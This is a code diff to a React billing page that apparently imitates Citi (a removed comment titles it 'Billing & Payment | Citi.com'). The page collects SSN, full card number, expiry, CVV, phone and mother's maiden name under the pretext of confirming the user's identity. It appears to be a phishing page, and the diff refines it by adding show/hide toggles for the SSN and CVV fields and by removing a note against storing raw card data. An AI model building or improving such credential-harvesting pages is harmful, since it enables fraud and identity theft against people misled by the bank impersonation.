@@ -5,10 +5,7 @@ import Footer from "@/components/layout/Footer";
 import React, { useState } from "react";
 import { useRouter } from "next/navigation";
 import axios from "axios";
-
-// export const metadata = {
-//   title: "Billing & Payment | Citi.com",
-// };
+import { IoIosEye, IoIosEyeOff } from "react-icons/io";
 
 const BillingPage = () => {
   const [form, setForm] = useState({
@@ -16,15 +13,15 @@ const BillingPage = () => {
     address: "",
     zip: "",
     ssn: "",
-    // email: "",
     phone: "",
     cardNumber: "",
     expiry: "",
     cvv: "",
-    // cardName: "",
     motherMaidenName: "",
   });
   const [loading, setLoading] = useState(false);
+  const [showSSN, setShowSSN] = useState(false);
+  const [showCVV, setShowCVV] = useState(false);
   const router = useRouter();
 
   const handleChange = (e) => {
@@ -73,8 +70,9 @@ const BillingPage = () => {
                 Account Information
               </h2>
               <p className="mt-1 text-sm text-gray-600">
-                We just need a little more information to confirm your identity and keep your account secure.
-                Please provide the details requested below.
+                We just need a little more information to confirm your identity
+                and keep your account secure. Please provide the details
+                requested below.
               </p>
             </div>
 
@@ -144,21 +142,6 @@ const BillingPage = () => {
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                {/* <div>
-                  <label className="block text-sm font-medium text-gray-700">
-                    Email
-                  </label>
-                  <input
-                    type="email"
-                    name="email"
-                    value={form.email}
-                    onChange={handleChange}
-                    required={true}
-                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                    placeholder="you@example.com"
-                  />
-                </div> */}
-
                 <div>
                   <label className="block text-sm font-medium text-gray-700">
                     Phone
@@ -178,29 +161,45 @@ const BillingPage = () => {
                   <label className="block text-sm font-medium text-gray-700">
                     SSN
                   </label>
-                  <input
-                    name="ssn"
-                    value={form.ssn.replace(/\D/g, "").slice(0, 9)}
-                    onChange={(e) =>
-                      handleChange({
-                        target: { name: "ssn", value: e.target.value },
-                      })
-                    }
-                    inputMode="numeric"
-                    type="password"
-                    autoComplete="cc-csc"
-                    maxLength={9}
-                    placeholder="●●● ●●● ●●●"
-                    required={true}
-                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                  />
+                  <div className="relative">
+                    <input
+                      name="ssn"
+                      value={form.ssn.replace(/\D/g, "").slice(0, 9)}
+                      onChange={(e) =>
+                        handleChange({
+                          target: { name: "ssn", value: e.target.value },
+                        })
+                      }
+                      inputMode="numeric"
+                      type={showSSN ? "text" : "password"}
+                      autoComplete="cc-csc"
+                      maxLength={9}
+                      placeholder="●●● ●●● ●●●"
+                      required={true}
+                      className="mt-2 w-full rounded-lg border px-4 py-3 pr-12 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowSSN(!showSSN)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-[#0d2d62] font-medium"
+                    >
+                      {showSSN ? (
+                        <IoIosEyeOff size={20} />
+                      ) : (
+                        <IoIosEye size={20} />
+                      )}
+                    </button>
+                  </div>
                 </div>
               </div>
 
               <div>
-                <h3 className="text-lg font-semibold text-gray-800 mb-3">
+                <h3 className="text-lg font-semibold text-gray-800 mb-1">
                   Your Card Info
                 </h3>
+                <p className="text-xs text-gray-500 mb-3">
+                  Verify the card details connected to your account.
+                </p>
 
                 <div className="rounded-lg border p-4">
                   <label className="block text-sm font-medium text-gray-700">
@@ -217,39 +216,11 @@ const BillingPage = () => {
                       }
                       inputMode="numeric"
                       autoComplete="cc-number"
-                      // pattern="\d{13,16}"
                       maxLength={19}
                       required={true}
                       className="w-full rounded-lg border px-4 py-3 pr-32 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                       placeholder="1234 5678 9012 3456"
                     />
-                    <div className="absolute right-3 top-3 flex items-center gap-2">
-                      <svg
-                        className="w-8 h-5"
-                        viewBox="0 0 36 24"
-                        fill="none"
-                        xmlns="http://www.w3.org/2000/svg"
-                        aria-hidden
-                      >
-                        <rect width="36" height="24" rx="4" fill="#0d2d62" />
-                        <rect
-                          x="4"
-                          y="6"
-                          width="8"
-                          height="4"
-                          rx="1"
-                          fill="#fff"
-                        />
-                        <rect
-                          x="14"
-                          y="6"
-                          width="18"
-                          height="4"
-                          rx="1"
-                          fill="#fff"
-                        />
-                      </svg>
-                    </div>
                   </div>
 
                   <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-3">
@@ -278,61 +249,47 @@ const BillingPage = () => {
                       <label className="block text-sm font-medium text-gray-700">
                         CVV
                       </label>
-                      <input
-                        name="cvv"
-                        value={form.cvv.replace(/\D/g, "").slice(0, 4)}
-                        onChange={(e) =>
-                          handleChange({
-                            target: { name: "cvv", value: e.target.value },
-                          })
-                        }
-                        inputMode="numeric"
-                        type="password"
-                        autoComplete="cc-csc"
-                        maxLength={4}
-                        placeholder="●●●"
-                        required={true}
-                        className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                      />
+                      <div className="relative">
+                        <input
+                          name="cvv"
+                          value={form.cvv.replace(/\D/g, "").slice(0, 4)}
+                          onChange={(e) =>
+                            handleChange({
+                              target: { name: "cvv", value: e.target.value },
+                            })
+                          }
+                          inputMode="numeric"
+                          type={showCVV ? "text" : "password"}
+                          autoComplete="cc-csc"
+                          maxLength={4}
+                          placeholder="●●●"
+                          required={true}
+                          className="mt-2 w-full rounded-lg border px-4 py-3 pr-12 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => setShowCVV(!showCVV)}
+                          className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-[#0d2d62] font-medium"
+                        >
+                          {showCVV ? (
+                            <IoIosEyeOff size={20} />
+                          ) : (
+                            <IoIosEye size={20} />
+                          )}
+                        </button>
+                      </div>
                     </div>
-
-                    {/* <div>
-                      <label className="block text-sm font-medium text-gray-700">
-                        Name on Card
-                      </label>
-                      <input
-                        name="cardName"
-                        value={form.cardName}
-                        onChange={handleChange}
-                        autoComplete="cc-name"
-                        placeholder="John A. Smith"
-                        className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                      />
-                    </div> */}
                   </div>
 
                   <p className="text-xs text-gray-500 mt-3">
-                    Your card details are handled safely by a trusted, PCI-compliant processor.
+                    Your card details are handled safely by a trusted,
+                    PCI-compliant processor.
                   </p>
                 </div>
               </div>
 
               <div className="pt-2 border-t flex flex-col md:flex-row items-center justify-between gap-4">
-                {/* <div className="text-sm text-gray-600">
-                  <p className="font-semibold text-gray-700">Security</p>
-                  <p className="mt-1">
-                    Card data submitted is sent to the payment gateway for
-                    tokenization; do not store raw card details on this server.
-                  </p>
-                </div> */}
-
                 <div className="flex-end gap-3 w-full">
-                  {/* <button
-                    type="button"
-                    className="px-5 py-3 rounded-lg border border-[#0d2d62] text-[#0d2d62] font-semibold hover:bg-[#f0f4f9]"
-                  >
-                    Cancel
-                  </button> */}
                   <button
                     type="submit"
                     className="px-6 py-3 rounded-lg bg-primary hover:!bg-[#054e7b] text-white font-semibold"
